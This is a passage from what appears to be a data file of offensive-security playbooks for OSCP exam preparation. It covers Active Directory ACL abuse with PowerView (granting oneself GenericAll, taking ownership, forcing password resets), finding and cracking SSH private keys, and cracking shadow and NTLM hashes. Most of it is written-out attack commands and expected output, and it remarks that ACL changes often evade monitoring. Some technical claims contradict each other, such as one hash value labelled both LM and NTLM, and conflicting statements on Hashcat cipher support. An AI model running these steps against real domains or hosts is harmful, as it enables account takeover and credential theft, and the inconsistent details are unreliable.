GenericAll on admin-svc. However, you have WriteDACL permission on admin-svc. WriteDACL allows you to modify the ACL itself - you can grant yourself GenericAll, then proceed with password reset."", ""approach"": ""WriteDACL is a two-step exploitation: (1) Modify target's ACL to grant yourself GenericAll, (2) Exercise the GenericAll permission (password reset, group addition, etc.). Use Add-DomainObjectAcl (PowerView) to add an ACE granting your account GenericAll, then proceed with standard abuse techniques."", ""commands"": [""powerview-get-objectacl-writedacl"", ""powerview-find-interestingdomainacl""], ""expected_outcome"": ""Get-ObjectAcl -Identity admin-svc shows auditor has WriteDACL. Run: Add-DomainObjectAcl -TargetIdentity admin-svc -PrincipalIdentity auditor -Rights All. Now re-enumerate: Get-ObjectAcl -Identity admin-svc | Where {$_.SecurityIdentifier -eq (ConvertTo-SID auditor)}. You now have GenericAll. Proceed with password reset or other abuse. This is a stealthier approach than direct GenericAll - many monitoring solutions don't alert on ACL modifications."", ""why_this_works"": ""WriteDACL permission allows modifying an object's Discretionary Access Control List (DACL). The DACL defines who can perform what actions on the object. By adding an ACE that grants yourself GenericAll, you're essentially making yourself the owner. This is a common misconfiguration in environments where 'security admins' are granted WriteDACL for delegation purposes but aren't monitored for ACL modifications.""}, {""title"": ""Scenario 4: WriteOwner Permission - Take Ownership Then Grant Access"", ""context"": ""You control 'corp\\developer' account. Target is a privileged group 'ServerAdmins' (local admin on 50+ servers). You have WriteOwner permission on ServerAdmins group. WriteOwner allows changing the object's owner - combine with owner's implicit Full Control to gain access."", ""approach"": ""WriteOwner is a three-step exploitation: (1) Take ownership of the object (Set-DomainObjectOwner), (2) As owner, you implicitly have WriteDACL, (3) Grant yourself GenericAll, (4) Add yourself to the group. This is the longest privilege escalation chain but works when you only have WriteOwner."", ""commands"": [""powerview-get-objectacl-writeowner"", ""powerview-find-interestingdomainacl""], ""expected_outcome"": ""Get-ObjectAcl -Identity ServerAdmins shows developer has WriteOwner. Run: Set-DomainObjectOwner -Identity ServerAdmins -OwnerIdentity developer. You're now the owner. As owner, you implicitly have Full Control. Run: Add-DomainObjectAcl -TargetIdentity ServerAdmins -PrincipalIdentity developer -Rights All. Now add yourself: Add-DomainGroupMember -Identity ServerAdmins -Members developer. You're now a member of ServerAdmins with local admin on 50+ servers."", ""why_this_works"": ""WriteOwner permission allows changing the 'Owner' attribute of an AD object. In Windows security model, the owner of an object has implicit Full Control (even if not explicitly listed in the ACL). This is by design - owners need the ability to fix broken ACLs. Once you're the owner, you can modify the DACL (grant yourself GenericAll), then exercise those permissions. This is often exploited in environments with delegated OU administration.""}, {""title"": ""Scenario 5: ForceChangePassword Extended Right - Direct Password Reset"", ""context"": ""You control 'corp\\helpdesk-t2' account. Target is 'corp\\dbadmin' (DBA account with sensitive data access). ACL shows helpdesk-t2 has 'User-Force-Change-Password' extended right on dbadmin (but NOT GenericAll). This specific right allows password resets without full control."", ""approach"": ""ForceChangePassword is a targeted privilege - it only allows password resets, not other modifications. Use Set-DomainUserPassword (PowerView) or native Set-ADAccountPassword to reset the target's password. This is stealthier than GenericAll (you're not granting broad permissions) and common in helpdesk delegation scenarios."", ""commands"": [""powerview-get-objectacl-forcechangepassword"", ""powerview-find-interestingdomainacl""], ""expected_outcome"": ""Get-ObjectAcl -Identity dbadmin | Where {$_.ObjectAceType -eq 'User-Force-Change-Password'} shows helpdesk-t2 has this right. Run: Set-DomainUserPassword -Identity dbadmin -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force). Password is now reset. Authenticate as dbadmin and access database servers. This is a common finding in OSCP exams - helpdesk delegation leads to privilege escalation."", ""why_this_works"": ""Active Directory supports Extended Rights - specific permissions beyond standard read/write/modify. 'User-Force-Change-Password' (GUID: 00299570-246d-11d0-a768-00aa006e0529) is an extended right that allows password resets without knowing the current password. This is delegated to helpdesk teams for password reset scenarios but becomes a privilege escalation vector when over-delegated. The reset happens server-side (DC) - no client-side validation of current password.""}]","[{""title"": ""Phase 1: Broad ACL Enumeration"", ""notes"": ""Cast wide net - identify ALL interesting ACLs where your account (or groups you're in) has excessive permissions. PowerView's Find-InterestingDomainAcl automates this. Focus on: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword."", ""commands"": [{""id"": ""powerview-find-interestingdomainacl"", ""example"": ""Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match \""stephanie\""}"", ""shows"": ""IdentityReferenceName""}, {""id"": ""powerview-get-objectacl-genericall"", ""example"": ""Get-ObjectAcl -Identity \""Domain Admins\"" | ? {$_.ActiveDirectoryRights -eq \""GenericAll\""} | select SecurityIdentifier,ActiveDirectoryRights"", ""shows"": ""SecurityIdentifier""}]}, {""title"": ""Phase 2: Targeted ACL Enumeration (High-Value Targets)"", ""notes"": ""Enumerate ACLs on specific high-value targets: Domain Admins group, Enterprise Admins, privileged users (adminCount=1), sensitive OUs. Even non-interesting permissions might be exploitable in context."", ""commands"": [{""id"": ""powerview-get-objectacl-group"", ""example"": ""Get-ObjectAcl -Identity \""Domain Admins\"" | select SecurityIdentifier,ActiveDirectoryRights"", ""shows"": ""SecurityIdentifier""}, {""id"": ""powerview-get-objectacl-user"", ""example"": ""Get-ObjectAcl -Identity \""sqlservice\"" | select SecurityIdentifier,ActiveDirectoryRights"", ""shows"": ""SecurityIdentifier""}, {""id"": ""ps-ldapsearch-admins"", ""example"": ""LDAPSearch -LDAPQuery \""(adminCount=1)\"""", ""shows"": ""adminCount""}]}, {""title"": ""Phase 3: SID Resolution & Path Validation"", ""notes"": ""ACLs reference objects by SID (Security Identifier) not name. Use Convert-SidToName to translate SIDs to usernames/group names. Verify you actually control the principal account. Check for indirect access via group membership (you might be in a group that has the permission)."", ""commands"": [{""id"": ""powerview-convert-sidtoname"", ""example"": ""Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104"", ""shows"": ""DOMAIN\\username""}, {""id"": ""powerview-get-netgroup-recursive"", ""example"": ""Get-NetGroupMember -GroupName \""Domain Admins\"" -Recurse"", ""shows"": ""MemberName""}]}, {""title"": ""Phase 4: Permission-Specific Enumeration"", ""notes"": ""Drill down on specific permission types if broad enumeration is too noisy. Each permission type has unique exploitation path: GenericAll (password reset/group addition), WriteDACL (grant yourself GenericAll), WriteOwner (take ownership first), ForceChangePassword (direct password reset)."", ""commands"": [{""id"": ""powerview-get-objectacl-genericall"", ""example"": ""Get-ObjectAcl -Identity \""Domain Admins\"" | ? {$_.ActiveDirectoryRights -eq \""GenericAll\""} | select SecurityIdentifier,ActiveDirectoryRights"", ""shows"": ""SecurityIdentifier""}, {""id"": ""powerview-get-objectacl-writedacl"", ""example"": ""Get-ObjectAcl -Identity \""Domain Admins\"" | ? {$_.ActiveDirectoryRights -match \""WriteDacl\""} | select SecurityIdentifier,ActiveDirectoryRights"", ""shows"": ""SecurityIdentifier""}, {""id"": ""powerview-get-objectacl-writeowner"", ""example"": ""Get-ObjectAcl -Identity \""Domain Admins\"" | ? {$_.ActiveDirectoryRights -match \""WriteOwner\""} | select SecurityIdentifier,ActiveDirectoryRights"", ""shows"": ""SecurityIdentifier""}, {""id"": ""powerview-get-objectacl-forcechangepassword"", ""example"": ""Get-ObjectAcl -Identity \""administrator\"" -ResolveGUIDs | ? {$_.ObjectAceType -eq \""User-Force-Change-Password\""} | select SecurityIdentifier,ObjectAceType"", ""shows"": ""SecurityIdentifier""}]}]"
"ssh-private-key-cracking","SSH Private Key Passphrase Cracking","Complete workflow for discovering, extracting, and cracking SSH private key passphrases","PASSWORD_ATTACKS|SSH|PRIVATE_KEY|PASSPHRASE|JOHN|OSCP:HIGH","{""how_to_recognize"": [""File enumeration reveals SSH private keys in: ~/.ssh/id_rsa, ~/.ssh/id_dsa, ~/.ssh/id_ecdsa, /root/.ssh/id_rsa"", ""Web server file disclosure vulnerabilities expose: .ssh directory, backup files (id_rsa.bak, id_rsa.old)"", ""Git repository leaks show: Private keys committed to .git/objects, Config files with embedded keys"", ""Source code contains: Hardcoded private keys, Base64-encoded keys in configuration files"", ""File starts with: -----BEGIN RSA PRIVATE KEY----- or -----BEGIN OPENSSH PRIVATE KEY-----""], ""when_to_look_for"": [""Post-exploitation: After gaining web shell or RCE on Linux system"", ""File disclosure: LFI vulnerability allows reading ~/.ssh/id_rsa"", ""Backup discovery: Found .tar.gz or .zip files containing home directory backups"", ""Git enumeration: Accidentally committed keys in repository history (.git/)"", ""OSCP exam: Need SSH access but don't have password (key provides alternative authentication)""]}","[{""title"": ""Scenario 1: Encrypted SSH Key from Web Disclosure"", ""context"": ""You've discovered Local File Inclusion (LFI) vulnerability in web application: http://192.168.45.100/index.php?page=../../../home/developer/.ssh/id_rsa. Downloaded private key successfully. Key header shows: -----BEGIN RSA PRIVATE KEY----- followed by: Proc-Type: 4,ENCRYPTED (indicates passphrase protection). Goal: Extract passphrase hash, crack it, and use key for SSH authentication."", ""approach"": ""1. Save downloaded key to file: id_rsa. 2. Verify encryption: grep ENCRYPTED id_rsa (presence confirms passphrase required). 3. Extract hash: ssh2john id_rsa > ssh.hash. 4. Examine hash format: cat ssh.hash (look for $sshng$ prefix and cipher type). 5. Identify cipher: $sshng$0$ = aes128-cbc, $sshng$6$ = aes256-cbc. 6. Check tool support: Hashcat supports aes-256-cbc ONLY (mode 22921), John supports ALL ciphers. 7. Choose tool based on cipher. 8. Benchmark and calculate time."", ""commands"": [""ssh2john-extract"", ""hashid"", ""hash-rate-benchmark"", ""calculate-crack-time"", ""john-ssh-key-crack""], ""expected_outcome"": ""ssh2john outputs: id_rsa:$sshng$0$8$salt$1184$encrypted_data. Grep shows: Cipher: aes-128-cbc. Tool choice: John the Ripper (supports all ciphers). Benchmark: john --test --format=SSH \u2192 ~5,000 c/s (candidates per second). Time: rockyou (14M) \u00f7 5,000 c/s = 2,800 seconds = 47 minutes. Strategy: Straight rockyou first. Success: id_rsa:$sshng$...:summer2023. Verification: chmod 600 id_rsa; ssh -i id_rsa developer@192.168.45.100 (enter passphrase 'summer2023', gain shell)."", ""why_this_works"": ""SSH private keys can be passphrase-protected (encrypts key with user password). Common ciphers: aes-128-cbc, aes-256-cbc, aes-256-ctr. John the Ripper supports ALL OpenSSH ciphers (broader compatibility). Hashcat limited to aes-256-cbc only (mode 22921). Users often choose WEAK passphrases (defeats purpose of encryption). Common passphrase patterns: Season + year (summer2023), Same as login password, Simple words (password, qwerty). Success because: User chose common passphrase, Passphrase in rockyou wordlist, Tools can extract and test passphrases. Speed: SSH hash cracking moderate (5k c/s typical), faster than KeePass, slower than NTLM.""}, {""title"": ""Scenario 2: Modern SSH Key with aes-256-ctr Cipher"", ""context"": ""Git repository enumeration reveals accidentally committed SSH key: .git/objects/.../id_rsa_backup. Key generated with modern OpenSSH (version 7.8+). Extract hash with ssh2john and notice cipher: $sshng$2$ (aes-256-ctr). Attempt Hashcat mode 22921 fails with error: 'Token length exception'. Modern keys use aes-256-ctr which Hashcat does NOT support. Must use John the Ripper instead."", ""approach"": ""1. Extract hash: ssh2john id_rsa_backup > ssh.hash. 2. Identify cipher: $sshng$2$ indicates aes-256-ctr (modern OpenSSH default). 3. Test Hashcat compatibility: hashcat -m 22921 ssh.hash rockyou.txt \u2192 ERROR: Token length exception. 4. Switch to John: john --wordlist=rockyou.txt ssh.hash. 5. Use rules for better coverage: john --wordlist=rockyou.txt --rules=Wordlist ssh.hash. 6. Monitor progress: john --show ssh.hash (displays cracked passwords). 7. Check status: john --status (shows progress and ETA)."", ""commands"": [""ssh2john-extract"", ""hashid"", ""john-ssh-key-crack"", ""john-rules-attack"", ""john-show-cracked"", ""john-status""], ""expected_outcome"": ""Hashcat fails with token error. John successfully processes hash. With rules, cracking completes: id_rsa_backup:$sshng$2$...:Welcome2024! (capitalized + year + special char). Time: Straight rockyou = 50 minutes (no hit). With Wordlist rules (~1,600 rules) = 20 hours (overnight job). Success on rule variation: welcome \u2192 Welcome2024! Verification: ssh -i id_rsa_backup user@target. Key insight: Modern SSH keys require John (NOT Hashcat). Rules critical for policy-compliant passphrases."", ""why_this_works"": ""OpenSSH 7.8+ defaults to aes-256-ctr cipher (more secure than CBC modes). Hashcat development focused on common formats (didn't implement all SSH ciphers). John the Ripper supports: aes-128-cbc, aes-192-cbc, aes-256-cbc, aes-128-ctr, aes-192-ctr, aes-256-ctr, 3des-cbc. Modern environments generate keys with: ssh-keygen -t rsa (defaults to aes-256-ctr since OpenSSH 7.8). Rules increase success for policy-compliant passphrases: Capitalization, Year appending, Special char requirements. Success factors: Tool compatibility (John only), Rule-based mutations, Patience (overnight cracking). Lesson: Check cipher BEFORE choosing tool (avoid wasted time).""}, {""title"": ""Scenario 3: Unencrypted SSH Key - Direct Usage"", ""context"": ""File transfer directory enumeration reveals: backup_keys.tar.gz. Extract archive and find: id_rsa_prod, id_rsa_dev, id_rsa_staging. Test encryption status: grep ENCRYPTED id_rsa_prod \u2192 No results. Key has NO passphrase (unencrypted private key). Can use directly without cracking. Goal: Determine which systems accept this key and gain access."", ""approach"": ""1. Verify key is unencrypted: ssh2john id_rsa_prod (outputs 'Not an encrypted key' error). 2. Set correct permissions: chmod 600 id_rsa_prod (SSH requires strict permissions). 3. Test key on known hosts: ssh -i id_rsa_prod user@target (if no passphrase prompt = unencrypted). 4. Enumerate potential usernames: Common (root, admin, developer, ubuntu, ec2-user), From web app (database users, config files), From /etc/passwd (if previously enumerated). 5. Test combinations: for user in root admin developer; do ssh -i id_rsa_prod $user@target; done. 6. Check authorized_keys for clues: Public key comment often contains username."", ""commands"": [""ssh2john-extract""], ""expected_outcome"": ""ssh2john reports: 'Not an encrypted key' (indicates no passphrase). Direct SSH attempt: ssh -i id_rsa_prod developer@192.168.45.100 \u2192 Immediate login (no passphrase prompt). Gained shell as 'developer' user. No cracking needed - unencrypted keys provide immediate access. Security finding: Unencrypted SSH key = severe vulnerability (anyone with file has access). Check key usage: ls -la ~/.ssh/authorized_keys (see which systems trust this key). Enumerate: sudo -l (check sudo privileges), cron jobs (scheduled tasks), Network connections (lateral movement)."", ""why_this_works"": ""SSH keys can be generated without passphrase: ssh-keygen -t rsa (press Enter when prompted for passphrase = no encryption). Unencrypted keys stored in plaintext (base64-encoded but NOT encrypted). File possession = authentication capability (no password needed). Use cases: Automation scripts (cron, CI/CD), Service accounts, Lazy administrators. Detection: ssh2john fails on unencrypted keys, No 'ENCRYPTED' header in key file, SSH doesn't prompt for passphrase. Success immediate: chmod 600 + ssh -i <key> = access. Risk: Keys often more powerful than passwords (service accounts, root access, trusted systems). Document finding for report: Critical vulnerability.""}, {""title"": ""Scenario 4: Custom Wordlist Based on Key Context"", ""context"": ""Backup directory contains: developer_id_rsa (encrypted SSH key), developer_notes.txt (text file with: 'SSH key passphrase: my cat's name + birth year'). Intelligence gathered: Developer has cat photos on desktop (filename: Whiskers_2019.jpg). Hypothesis: Passphrase is 'Whiskers2019' or variations. Create targeted wordlist instead of blind rockyou attack."", ""approach"": ""1. Extract hash: ssh2john developer_id_rsa > dev.hash. 2. Create custom wordlist from intelligence: Cat name variations (Whiskers, whiskers, WHISKERS), Years (2015-2024 for birth years), Combinations (Whiskers2019, whiskers2019, Whiskers19). 3. Add common patterns: CatName + Year, catname + Year, CATNAME + YEAR, Cat + year + special (Whiskers2019!). 4. Generate: echo -e 'Whiskers2019\\nwhiskers2019\\nWhiskers19\\nWhiskers2019!' > custom.txt. 5. Calculate: ~50 candidates \u00f7 5,000 c/s = instant. 6. Run: john --wordlist=custom.txt dev.hash."", ""commands"": [""ssh2john-extract"", ""create-policy-rules"", ""wordlist-effectiveness"", ""john-ssh-key-crack"", ""john-show-cracked""], ""expected_outcome"": ""Custom wordlist attack completes instantly (<1 second). Success: developer_id_rsa:$sshng$...:Whiskers2019! (capitalized name + year + special char). Intelligence-driven attack: 10 minutes (wordlist creation) + 1 second (cracking) vs 47 minutes (blind rockyou). Verification: ssh -i developer_id_rsa developer@target. Key insight: Context clues (notes, files, usernames) create effective custom wordlists. 50 targeted candidates > 14M generic candidates. Time savings critical in exam scenarios."", ""why_this_works"": ""Humans choose memorable passphrases (personal significance). Common sources: Pet names, Family members, Important dates, Hobbies/interests. Context clues reveal patterns: Notes/documentation (explicit hints), File names (Whiskers_2019.jpg), User profiles (social media, employee directory). Small targeted wordlist advantages: Fast creation (manual), Instant cracking (small keyspace), High success rate (intelligence-driven). Math: 50 candidates \u00f7 5,000 c/s = 0.01 seconds vs rockyou 14M \u00f7 5,000 = 47 minutes. Success because: User followed common pattern, Intelligence provided key variables, Custom wordlist captured variations. Methodology: Always search for context BEFORE attacking.""}, {""title"": ""Scenario 5: Multiple Keys - Prioritization Strategy"", ""context"": ""Compromised backup server contains directory: /backup/ssh_keys/ with 25 encrypted SSH keys (id_rsa_server1, id_rsa_db, id_rsa_web, etc.). You have limited exam time (2 hours remaining). Cannot crack all keys. Need strategy to prioritize high-value targets: root keys, production systems, database servers. Goal: Identify and crack most valuable keys first."", ""approach"": ""1. Enumerate keys: ls -lah /backup/ssh_keys/ (check file sizes, dates). 2. Prioritize by filename: root_ prefix (root access), db_ prefix (database servers), prod_ prefix (production), _admin suffix (admin accounts). 3. Test encryption status: for key in *.rsa; do ssh2john $key 2>&1 | grep -q 'Not an encrypted key' && echo 'UNENCRYPTED: $key'; done. 4. Extract hashes for priority keys: ssh2john id_rsa_root > root.hash, ssh2john id_rsa_db_prod > db.hash. 5. Run parallel cracks: john --wordlist=rockyou.txt root.hash db.hash (John processes multiple hashes). 6. Monitor: john --show (displays cracked passwords in real-time). 7. Use first successful crack immediately (don't wait for all)."", ""commands"": [""ssh2john-extract"", ""john-ssh-key-crack"", ""john-show-cracked"", ""john-status""], ""expected_outcome"": ""Prioritization: id_rsa_root (highest priority), id_rsa_db_prod (database access), id_rsa_web_admin (web server admin). Unencrypted check finds: id_rsa_backup (no passphrase - use immediately). Parallel cracking: root.hash + db.hash processed simultaneously. First crack after 15 minutes: id_rsa_db_prod:password123. Immediate usage: ssh -i id_rsa_db_prod dbadmin@192.168.45.100. Gained database server access. Continue cracking root.hash in background. Time optimization: Parallel processing + prioritization + immediate usage = maximum exam efficiency."", ""why_this_works"": ""Multiple hash cracking: John processes multiple hashes simultaneously (tests each password against ALL hashes). Efficiency: Single wordlist pass cracks multiple keys. Prioritization critical for time-constrained scenarios (exam = 24 hours). High-value targets: root keys (full system access), Database keys (credential access), Production keys (business-critical). Filename analysis reveals purpose: Naming conventions (id_rsa_root, id_rsa_prod), Creation dates (recent = actively used), File sizes (larger keys = higher security?). Parallel + Prioritization: Don't crack sequentially (wastes time), Process high-value targets first, Use successful cracks immediately (don't wait). Success factors: Strategic target selection, Parallel processing, Immediate exploitation, Time awareness.""}]","[{""title"": ""Phase 1: SSH Key Discovery"", ""notes"": ""Search for SSH private keys across filesystem and backups. Common locations: User home directories (~/.ssh/id_rsa, id_dsa, id_ecdsa, id_ed25519), Root directory (/root/.ssh/id_rsa), Backup locations (*.tar.gz, *.zip, .git/, /backup/), Web server directories (/var/www/html/.ssh/), Service accounts (/home/service-user/.ssh/). File extensions: No extension (id_rsa), .pem (PEM format), .key (generic key file), .ppk (PuTTY format - requires conversion). Search commands: find / -name id_rsa 2>/dev/null, find / -name '*.pem' 2>/dev/null, grep -r 'BEGIN.*PRIVATE KEY' /var/www/ 2>/dev/null. Check permissions: ls -la ~/.ssh/ (world-readable keys = misconfiguration)."", ""commands"": []}, {""title"": ""Phase 2: Encryption Status Verification"", ""notes"": ""Determine if key is encrypted before attempting extraction. Encrypted indicators: Header 'Proc-Type: 4,ENCRYPTED', Header 'DEK-Info: AES-256-CBC,...', ssh2john succeeds (outputs hash). Unencrypted indicators: No ENCRYPTED header, ssh2john fails with 'Not an encrypted key', SSH accepts key without passphrase prompt. Quick test: ssh -i <KEY> user@target (no passphrase prompt = unencrypted). Unencrypted keys: Use immediately (no cracking needed), Document as critical finding (security vulnerability). Encrypted keys: Proceed to hash extraction (requires passphrase cracking)."", ""commands"": [{""id"": ""ssh2john-extract"", ""example"": ""ssh2john id_rsa > ssh.hash"", ""shows"": ""$sshng$""}]}, {""title"": ""Phase 3: Hash Extraction and Tool Selection"", ""notes"": ""Extract passphrase hash using ssh2john. Syntax: ssh2john <KEYFILE> > hash.txt. Clean hash: Remove 'filename:' prefix for Hashcat (keep for John). Identify cipher from hash: $sshng$0$ = aes-128-cbc (Hashcat compatible), $sshng$1$ = aes-192-cbc (Hashcat compatible), $sshng$2$ = aes-256-ctr (John ONLY), $sshng$6$ = aes-256-cbc (Hashcat compatible). Tool selection: Hashcat = aes-256-cbc only (mode 22921), fast on GPU. John = ALL ciphers, CPU-based, broader compatibility. Benchmark both: hashcat -b -m 22921 (if compatible), john --test --format=SSH. Choose faster tool for your hardware + cipher combination."", ""commands"": [{""id"": ""ssh2john-extract"", ""example"": ""ssh2john id_rsa > ssh.hash"", ""shows"": ""$sshng$""}, {""id"": ""hashid"", ""example"": ""hashid '5f4dcc3b5aa765d61d8327deb882cf99' -m"", ""shows"": ""[+] MD5""}, {""id"": ""hash-identifier"", ""example"": ""hash-identifier"", ""shows"": ""Possible Hashs:""}, {""id"": ""hash-rate-benchmark"", ""example"": ""hashcat -b -m 1000 | grep -A3 'Hashmode:'"", ""shows"": ""Hash rate displayed (H/s, kH/s, MH/s, GH/s)""}]}, {""title"": ""Phase 4: Intelligence Gathering for Custom Wordlists"", ""notes"": ""Before blind dictionary attacks, search for context clues to create targeted wordlist. Look for: README files (password hints, naming conventions), User profiles (pet names, birth years, interests), File names (personal photos, documents with dates), Code comments (passphrase format hints), Documentation (password policies, company naming standards). Common SSH passphrase patterns: Season + Year (Summer2024), Username + digits (john1234), Pet name + year (Whiskers2019), Company + year (Contoso2024!). Create custom wordlist: List key variables (names, years, company), Generate combinations (capitalization, special chars), Test variations (append, prepend). Custom wordlist benefits: Smaller keyspace (faster), Higher success rate (intelligence-driven), Time-efficient (exam scenarios)."", ""commands"": [{""id"": ""create-policy-rules"", ""example"": ""echo -e 'c $2024 $!\\nc $2024 $@\\nc $2024 $#' > policy.rule"", ""shows"": ""Rule file created""}, {""id"": ""rule-capitalize-append"", ""example"": ""echo 'c $!' > cap-special.rule"", ""shows"": ""Rule file created""}, {""id"": ""rule-prepend-year"", ""example"": ""echo '^2 ^0 ^2 ^4' > prepend-year.rule"", ""shows"": ""Rule file created""}, {""id"": ""wordlist-effectiveness"", ""example"": ""wc -l /usr/share/wordlists/rockyou.txt && echo 'With rules: ' && python3 -c \""lines=14344391; rules=64; print(f'{lines * rules:,} total candidates')\"""", ""shows"": ""Line count displayed""}]}, {""title"": ""Phase 5: Cracking Execution"", ""notes"": ""Launch passphrase cracking with appropriate tool and strategy. For Hashcat-compatible ciphers (aes-256-cbc): hashcat -m 22921 hash.txt rockyou.txt, Add rules if needed: -r /usr/share/hashcat/rules/best64.rule. For John-only ciphers (aes-256-ctr): john --wordlist=rockyou.txt hash.txt, Use rules: --rules=Wordlist. Session management: Hashcat: --session=ssh-crack (pause/resume), John: Automatic restore (john --restore). Monitor progress: Hashcat: --status, John: --status, Check results: john --show hash.txt. Time estimates: SSH keys moderate speed (~5,000 c/s), Faster than KeePass, slower than NTLM. Adjust strategy based on time constraints."", ""commands"": [{""id"": ""hashcat-ssh-key-crack"", ""example"": ""hashcat -m 22921 ssh.hash custom_wordlist.txt -r custom.rule --force"", ""shows"": ""Cracked""}, {""id"": ""john-ssh-key-crack"", ""example"": ""john --wordlist=custom_wordlist.txt --rules=sshRules ssh.hash"", ""shows"": ""Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH])""}, {""id"": ""hashcat-rule-attack"", ""example"": ""hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"", ""shows"": ""Guess.Mod........: Rules""}, {""id"": ""john-rules-attack"", ""example"": ""john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash"", ""shows"": ""guesses: X""}, {""id"": ""john-show-cracked"", ""example"": ""john --show hashes.txt"", ""shows"": ""username:password""}, {""id"": ""john-status"", ""example"": ""john --status"", ""shows"": ""Session..........: ""}, {""id"": ""session-management"", ""example"": ""hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt --session=exam-target1 -o cracked.txt --outfile-format=2"", ""shows"": ""Session started""}]}, {""title"": ""Phase 6: Key Usage and Verification"", ""notes"": ""After successful passphrase crack, use key for SSH authentication. Preparation: Set correct permissions: chmod 600 <KEYFILE> (SSH requires this). Verify passphrase: ssh -i <KEYFILE> user@target (enter cracked passphrase). Common issues: 'Permissions too open' = chmod 600 needed, 'Permission denied (publickey)' = Wrong username or key not authorized, 'Load key: invalid format' = Corrupted key or wrong format. Troubleshooting: Test with verbose: ssh -v -i <KEYFILE> user@target, Check authorized_keys on target: cat ~/.ssh/authorized_keys (must contain matching public key). Post-access: Enumerate privileges: sudo -l, Check other authorized_keys: find /home -name authorized_keys 2>/dev/null, Look for key comments (public key often has username@hostname)."", ""commands"": [{""id"": ""john-show-cracked"", ""example"": ""john --show hashes.txt"", ""shows"": ""username:password""}]}]"
"hash-cracking-methodology","Hash Cracking Methodology","Complete workflow for identifying, preparing, and cracking password hashes using Hashcat and John the Ripper","PASSWORD_ATTACKS|HASH_CRACKING|HASHCAT|JOHN|METHODOLOGY|OSCP:HIGH","{""how_to_recognize"": [""You've extracted password hashes from: /etc/shadow (Linux), SAM database (Windows), database dumps (SQL injection), configuration files (.env, config.php)"", ""Hash format patterns: 32 hex chars (MD5/NTLM), 40 hex (SHA1), 64 hex (SHA256), $6$ prefix (sha512crypt), $2b$ (bcrypt)"", ""Application password fields show hashed values instead of plaintext in database dumps"", ""Web application uses password_hash() or bcrypt() functions (source code review)"", ""Obtained hashes but need plaintext passwords for authentication""], ""when_to_look_for"": [""After successful SQL injection with admin table access (SELECT username,password FROM users)"", ""Post-exploitation on Linux: cat /etc/shadow reveals sha512crypt hashes ($6$)"", ""Post-exploitation on Windows: mimikatz or secretsdump.py extracts NTLM hashes"", ""During source code review: Found password hashes in configuration files, backups, or git history"", ""OSCP exam scenarios: Need to pivot laterally using cracked domain credentials""]}","[{""title"": ""Scenario 1: Linux /etc/shadow Hash Cracking"", ""context"": ""You've compromised a Linux web server via file upload vulnerability. You exfiltrated /etc/shadow and discovered user 'john' with hash: john:$6$salt$long_hash. The $6$ prefix indicates sha512crypt. Hash rate benchmark shows 10,000 H/s on your GPU. You have 4 hours of exam time remaining. Goal: Crack john's password for privilege escalation."", ""approach"": ""1. Identify hash type: $6$ = sha512crypt (Linux default since 2011). 2. Benchmark: hashcat -b -m 1800 (mode 1800 = sha512crypt). Result: 10 kH/s. 3. Calculate time: rockyou.txt (14M) \u00f7 10,000 H/s = 1,400 seconds = 23 minutes (straight wordlist). 4. Strategy: Start with straight rockyou, then rockyou + best64.rule. 5. Extract hash to file (john.hash). 6. Run: hashcat -m 1800 john.hash rockyou.txt. 7. Monitor progress with status updates. 8. If straight fails, escalate to rules."", ""commands"": [""hash-rate-benchmark"", ""calculate-crack-time"", ""hashcat-sha512crypt-crack"", ""hashcat-show-cracked"", ""hashcat-status-timer"", ""hashcat-rule-attack""], ""expected_outcome"": ""Hashcat tests rockyou.txt passwords against sha512crypt hash at ~10,000 H/s. Progress: 0% \u2192 50% (7M tested) \u2192 CRACKED after 15 minutes. Output: john:$6$salt$hash:password123. Verification: su john (enter password123, gain shell). Time saved: Straight wordlist faster than rules (no extra time for exam). Next: Check john's sudo privileges, enumerate cron jobs, search for credentials in john's home directory."", ""why_this_works"": ""sha512crypt is SLOW by design (key derivation function with 5,000 rounds by default). Slows down brute-force but also dictionary attacks. Hashcat uses GPU acceleration (10,000 H/s vs CPU: 1,000 H/s). rockyou.txt contains real passwords from RockYou breach (32M users). Sorted by frequency - most common passwords tested first. Password123 is in top 1,000 (high probability). Success because: 1) User chose common password, 2) Wordlist contains password, 3) Time estimate aligned with exam constraints. If straight fails: Add rules (best64 = 14M \u00d7 64 = 896M candidates, ~24 hours).""}, {""title"": ""Scenario 2: NTLM Hash Cracking with Rules"", ""context"": ""You've dumped NTLM hashes from Windows domain controller using secretsdump.py: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::. The second hash (31d6...) is LM, third is NTLM. You need Administrator plaintext for RDP access. NTLM cracks MUCH faster than LM. Benchmark: 50 GH/s (50 billion H/s). Current time: 1 hour into exam."", ""approach"": ""1. Extract NTLM hash (after third colon): 31d6cfe0d16ae931b73c59d7e0c089c0. 2. Save to file: admin.ntlm. 3. Identify: 32 hex chars = MD5 or NTLM (use hashid to confirm). Mode 1000 for NTLM. 4. Benchmark: hashcat -b -m 1000 \u2192 50 GH/s. 5. Time estimate: rockyou (14M) \u00f7 50B H/s = 0.28 seconds (straight). Rules: 14M \u00d7 64 \u00f7 50B = 18 seconds (best64). 6. Strategy: Straight first, then best64, then rockyou-30000 if needed. 7. Run with session management for resume capability."", ""commands"": [""hashid"", ""hash-rate-benchmark"", ""hashcat-ntlm-crack"", ""hashcat-best64-rules"", ""hashcat-show-cracked"", ""session-management""], ""expected_outcome"": ""Straight wordlist completes in <1 second (NTLM extremely fast). If no hit, best64 rules complete in ~18 seconds. Expected hit with rules: Password1, Welcome1, Admin123! Success: Administrator:31d6...:Admin123! Verification: xfreerdp /u:Administrator /p:Admin123! /v:192.168.45.100. Gain Domain Admin access. Next: Dump all domain hashes (ntdsutil), enumerate group policy, check for domain trusts. Time investment: <1 minute total (NTLM speed enables aggressive rule attacks)."", ""why_this_works"": ""NTLM is FAST hash (no salt, no iterations, simple MD4). Designed for speed (backwards compatibility), not security. GPU acceleration: 50 GH/s = 50 billion attempts per second. At this speed, entire rockyou + best64 rules (896M candidates) = 18 seconds. Rule-based success: 